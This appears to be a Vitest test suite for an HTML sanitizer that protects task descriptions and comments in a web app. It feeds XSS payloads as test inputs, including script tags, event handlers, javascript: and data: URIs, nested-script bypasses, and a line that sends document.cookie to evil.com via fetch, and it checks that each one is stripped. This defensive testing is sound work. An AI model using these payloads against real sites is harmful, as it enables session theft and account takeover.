import { describe, it, expect } from 'vitest';
import { sanitizeHtml, sanitizeRichText } from '@/lib/sanitize';

// ─── sanitizeHtml ─────────────────────────────────────────────

describe('sanitizeHtml', () => {
  it('passes through safe HTML content', () => {
    const input = '<p>Hello, world!</p>';
    expect(sanitizeHtml(input)).toBe('<p>Hello, world!</p>');
  });

  it('passes through rich text with allowed formatting', () => {
    const input = '<h1>Title</h1><p>Some <strong>bold</strong> and <em>italic</em> text.</p>';
    const result = sanitizeHtml(input);
    expect(result).toContain('<h1>Title</h1>');
    expect(result).toContain('<strong>bold</strong>');
    expect(result).toContain('<em>italic</em>');
  });

  it('passes through unordered lists', () => {
    const input = '<ul><li>Item 1</li><li>Item 2</li></ul>';
    const result = sanitizeHtml(input);
    expect(result).toBe('<ul><li>Item 1</li><li>Item 2</li></ul>');
  });

  it('passes through ordered lists', () => {
    const input = '<ol><li>First</li><li>Second</li></ol>';
    const result = sanitizeHtml(input);
    expect(result).toBe('<ol><li>First</li><li>Second</li></ol>');
  });

  it('passes through blockquotes', () => {
    const input = '<blockquote>Cited text</blockquote>';
    const result = sanitizeHtml(input);
    expect(result).toBe('<blockquote>Cited text</blockquote>');
  });

  it('passes through code blocks', () => {
    const input = '<pre><code>const x = 1;</code></pre>';
    const result = sanitizeHtml(input);
    expect(result).toBe('<pre><code>const x = 1;</code></pre>');
  });

  it('passes through links with href', () => {
    const input = '<a href="https://example.com">Link</a>';
    const result = sanitizeHtml(input);
    expect(result).toBe('<a href="https://example.com">Link</a>');
  });

  // ── Dangerous Tag Removal ────────────────────────────────

  it('strips script tags', () => {
    const input = '<script>alert("xss")</script><p>Safe</p>';
    expect(sanitizeHtml(input)).toBe('<p>Safe</p>');
  });

  it('strips iframe tags', () => {
    const input = '<iframe src="https://evil.com"></iframe><p>Safe</p>';
    expect(sanitizeHtml(input)).toBe('<p>Safe</p>');
  });

  it('strips object tags', () => {
    const input = '<object data="evil.swf"></object><p>Safe</p>';
    expect(sanitizeHtml(input)).toBe('<p>Safe</p>');
  });

  it('strips embed tags', () => {
    const input = '<embed src="evil.swf"><p>Safe</p>';
    expect(sanitizeHtml(input)).toBe('<p>Safe</p>');
  });

  it('strips style tags', () => {
    const input = '<style>body { background: black; }</style><p>Safe</p>';
    expect(sanitizeHtml(input)).toBe('<p>Safe</p>');
  });

  it('strips form and input tags', () => {
    const input = '<form action="https://evil.com"><input type="text"></form><p>Safe</p>';
    expect(sanitizeHtml(input)).toBe('<p>Safe</p>');
  });

  it('strips entirely malicious content leaving empty string', () => {
    const input = '<script>alert("xss")</script>';
    expect(sanitizeHtml(input)).toBe('');
  });

  // ── Event Handler Removal ──────────────────────────────

  it('removes onclick event handlers', () => {
    const input = '<p onclick="alert(1)">Click me</p>';
    const result = sanitizeHtml(input);
    expect(result).not.toContain('onclick');
    expect(result).toContain('Click me');
  });

  it('removes onerror event handlers', () => {
    const input = '<img src=x onerror="alert(1)">';
    const result = sanitizeHtml(input);
    expect(result).not.toContain('onerror');
  });

  it('removes onload event handlers', () => {
    const input = '<p onload="alert(1)">Safe</p>';
    const result = sanitizeHtml(input);
    expect(result).not.toContain('onload');
  });

  it('removes onmouseover event handlers', () => {
    const input = '<p onmouseover="alert(1)">Hover me</p>';
    const result = sanitizeHtml(input);
    expect(result).not.toContain('onmouseover');
    expect(result).toContain('Hover me');
  });

  it('removes all event handler attributes regardless of prefix', () => {
    const input = '<p onfocus="alert(1)" onblur="alert(1)" onchange="alert(1)">Safe</p>';
    const result = sanitizeHtml(input);
    expect(result).not.toContain('onfocus');
    expect(result).not.toContain('onblur');
    expect(result).not.toContain('onchange');
  });

  // ── Dangerous URI Schemes ──────────────────────────────

  it('strips javascript: URLs from href', () => {
    const input = '<a href="javascript:alert(1)">Click</a>';
    const result = sanitizeHtml(input);
    expect(result).not.toContain('javascript:');
  });

  it('strips javascript: URLs from img src', () => {
    const input = '<img src="javascript:alert(1)">';
    const result = sanitizeHtml(input);
    // The img tag should be preserved but src removed or cleaned
    expect(result).not.toContain('javascript:');
  });

  it('strips data: URLs from anchors', () => {
    const input = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
    const result = sanitizeHtml(input);
    expect(result).not.toContain('data:text/html');
  });

  it('strips vbscript: URLs', () => {
    const input = '<a href="vbscript:msgbox(1)">Click</a>';
    const result = sanitizeHtml(input);
    expect(result).not.toContain('vbscript:');
  });

  // ── Null / Undefined / Edge Cases ──────────────────────

  it('returns empty string for null', () => {
    expect(sanitizeHtml(null)).toBe('');
  });

  it('returns empty string for undefined', () => {
    expect(sanitizeHtml(undefined)).toBe('');
  });

  it('returns empty string for empty string', () => {
    expect(sanitizeHtml('')).toBe('');
  });

  it('passes through plain text without HTML tags', () => {
    const input = 'Just some plain text with special chars: < > & "';
    // DOMPurify may escape some chars, but should not add dangerous content
    const result = sanitizeHtml(input);
    expect(result).toContain('Just some plain text');
  });

  it('handles mixed content with HTML entities', () => {
    const input = '<p>Price &amp; availability &lt; 10</p>';
    const result = sanitizeHtml(input);
    expect(result).toContain('&amp;');
    expect(result).toContain('&lt;');
  });

  it('preserves allowed inline styles', () => {
    const input = '<p style="color: red; font-weight: bold;">Styled text</p>';
    const result = sanitizeHtml(input);
    expect(result).toContain('Styled text');
  });

  it('strips disallowed CSS properties from style attributes', () => {
    const input = '<p style="position: fixed; top: 0; left: 0; width: 100%; z-index: 9999; background: url(javascript:alert(1))">Clickjacking attempt</p>';
    const result = sanitizeHtml(input);
    // Dangerous CSS properties should be removed
    expect(result).not.toContain('position');
    expect(result).not.toContain('z-index');
  });

  it('handles deeply nested script tag bypass attempts', () => {
    // Nested script tags, a common bypass technique
    // DOMPurify strips the script tags; text content like 'alert(1)' remains
    // as harmless text since the script execution context is removed
    const input = '<scr<script>ipt>alert(1)</scr</script>ipt>';
    const result = sanitizeHtml(input);
    // Script tags should be removed — no <script> should remain
    expect(result).not.toContain('<script>');
    // The text content 'alert(1)' is fine as long as it's not executable
    expect(result).toContain('alert(1)');
  });

  it('handles svg with onload attribute', () => {
    // SVG + script polyglot — onload should be stripped
    const input = '<svg onload="alert(1)"><p>Safe</p></svg>';
    const result = sanitizeHtml(input);
    expect(result).not.toContain('onload');
    // The safe paragraph content should remain
    expect(result).toContain('Safe');
  });
});

// ─── sanitizeRichText ─────────────────────────────────────────

describe('sanitizeRichText', () => {
  it('returns null for null input', () => {
    expect(sanitizeRichText(null)).toBeNull();
  });

  it('returns null for undefined input', () => {
    expect(sanitizeRichText(undefined)).toBeNull();
  });

  it('returns sanitized string for valid HTML', () => {
    const input = '<p>Safe content</p>';
    expect(sanitizeRichText(input)).toBe('<p>Safe content</p>');
  });

  it('returns null for completely malicious input', () => {
    const input = '<script>alert("xss")</script>';
    expect(sanitizeRichText(input)).toBeNull();
  });

  it('returns sanitized string for mixed safe and dangerous content', () => {
    const input = '<script>alert(1)</script><p>Safe</p>';
    expect(sanitizeRichText(input)).toBe('<p>Safe</p>');
  });

  it('handles TipTap-generated HTML safely', () => {
    // Typical HTML output from TipTap
    const input = '<h2>Task Overview</h2><p>This task involves <strong>critical</strong> work.</p><ul><li><p>Step 1</p></li><li><p>Step 2</p></li></ul><blockquote><p>Note: Important milestone</p></blockquote>';
    const result = sanitizeRichText(input);
    expect(result).toContain('Task Overview');
    expect(result).toContain('Step 1');
    expect(result).toContain('<strong>critical</strong>');
    expect(result).not.toContain('<script>');
  });
});

// ─── Comment Content Sanitization ─────────────────────────────
//
// These tests simulate the exact sanitization pattern used in
// POST /api/tasks/[id]/comments/route.ts:
//   const content = sanitizeRichText(rawContent) ?? '';
//
// Comments are currently rendered as React textContent (safe), but
// we sanitize before storage for defense-in-depth and consistency
// with the task description sanitization pipeline.

describe('comment content sanitization', () => {
  it('passes through plain text comments', () => {
    // Most comments are plain text — they should survive sanitization
    const input = 'This is a normal comment about the task.';
    // Simulate the route pattern: sanitizeRichText(rawContent) ?? ''
    const result = sanitizeRichText(input) ?? '';
    expect(result).toContain('normal comment');
  });

  it('strips script tags from malicious comment content', () => {
    // An attacker tries to inject JS via a comment
    const input = '<script>document.cookie</script>Great work!';
    const result = sanitizeRichText(input) ?? '';
    expect(result).not.toContain('<script>');
    // The safe text content should survive
    expect(result).toContain('Great work!');
  });

  it('handles comments with only safe HTML formatting', () => {
    const input = 'Check out <strong>this</strong> approach.';
    const result = sanitizeRichText(input) ?? '';
    // Bold formatting should be preserved
    expect(result).toContain('<strong>this</strong>');
  });

  it('strips iframe embeds from comments', () => {
    const input = 'Check this out: <iframe src="https://evil.com"></iframe> Nice!';
    const result = sanitizeRichText(input) ?? '';
    expect(result).not.toContain('<iframe');
    expect(result).toContain('Nice!');
  });

  it('strips event handlers from formatted comment text', () => {
    // An attacker uses clickjacking via formatted text
    const input = '<p onclick="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">Click here for prizes!</p>';
    const result = sanitizeRichText(input) ?? '';
    expect(result).not.toContain('onclick');
    expect(result).toContain('Click here');
  });

  it('removes javascript: links from comments', () => {
    const input = 'Visit <a href="javascript:alert(1)">this link</a> for details.';
    const result = sanitizeRichText(input) ?? '';
    expect(result).not.toContain('javascript:');
    expect(result).toContain('this link');
  });

  it('handles empty comment content', () => {
    // Empty comment should be caught by Zod before reaching sanitization,
    // but the sanitizer should handle it gracefully
    const result = sanitizeRichText('') ?? '';
    expect(result).toBe('');
  });

  it('handles completely malicious comment as empty string', () => {
    // Simulate: someone bypasses client validation and sends pure script
    const input = '<script>alert("xss")</script>';
    const result = sanitizeRichText(input) ?? '';
    // sanitizeRichText returns null for completely malicious content,
    // and the ?? '' fallback converts it to empty string
    expect(result).toBe('');
  });

  it('strips data URIs from comment images', () => {
    // An attacker tries to embed a crafted SVG via data URI in an img tag
    const input = 'See <img src="data:image/svg+xml,<script>alert(1)</script>"> this';
    const result = sanitizeHtml(input);
    // The src should be removed or stripped of the dangerous data URI
    expect(result).not.toContain('data:image/svg+xml');
  });

  it('allows legitimate URLs in comment links', () => {
    const input = 'Reference: <a href="https://docs.example.com/guide">the guide</a>';
    const result = sanitizeRichText(input) ?? '';
    expect(result).toContain('https://docs.example.com/guide');
    expect(result).toContain('the guide');
  });

  it('strips form elements from comments', () => {
    // Phishing attempt via embedded form in a comment
    const input = 'Enter password: <input type="password" name="pwd"> <button>Submit</button>';
    const result = sanitizeRichText(input) ?? '';
    expect(result).not.toContain('<input');
    expect(result).not.toContain('<button');
    // Text content should survive
    expect(result).toContain('Enter password');
  });

  it('handles multiline comment content with formatting', () => {
    const input = 'First line\n\n<strong>Important:</strong>\n<ul><li>Point one</li><li>Point two</li></ul>';
    const result = sanitizeRichText(input) ?? '';
    expect(result).toContain('First line');
    expect(result).toContain('<strong>Important:</strong>');
    expect(result).toContain('<ul><li>');
  });

  it('strips style tags from comments', () => {
    // CSS injection in comments could be used for data exfiltration
    const input = '<style>body { background: url("https://evil.com/steal"); }</style>Looks normal';
    const result = sanitizeRichText(input) ?? '';
    expect(result).not.toContain('<style>');
    expect(result).toContain('Looks normal');
  });
});
